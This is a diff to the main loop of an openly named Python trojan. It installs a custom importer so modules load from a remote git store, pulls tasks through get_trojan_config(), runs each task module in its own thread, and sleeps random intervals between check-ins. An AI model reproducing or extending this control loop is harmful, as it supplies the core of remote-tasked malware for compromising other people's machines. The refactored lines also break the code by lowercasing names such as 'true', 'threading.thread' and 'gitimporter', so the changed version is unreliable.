@@ -99,23 +99,25 @@ def module_runner(module):
 
     return
 
-sys.meta_path = [GitImporter()]
 
-while True:
-    if task_queue.empty():
-        config = get_trojan_config()
+def main():
+    sys.meta_path = [gitimporter()]
 
-        for task in config:
-            t = threading.Thread(target=module_runner, args=(task['module'],))
-            t.start()
-            time.sleep(random.randint(1, 10))
+    while true:
+        if task_queue.empty():
+            config = get_trojan_config()
 
-
-    time.sleep(random.randint(1000, 100000))
-
+            for task in config:
+                t = threading.thread(target=module_runner, args=(task['module'],))
+                t.start()
+                time.sleep(random.randint(1, 10))
 
 
+        time.sleep(random.randint(1000, 100000))
 
+
+if __name__ == '__main__':
+    main()
 
 
 
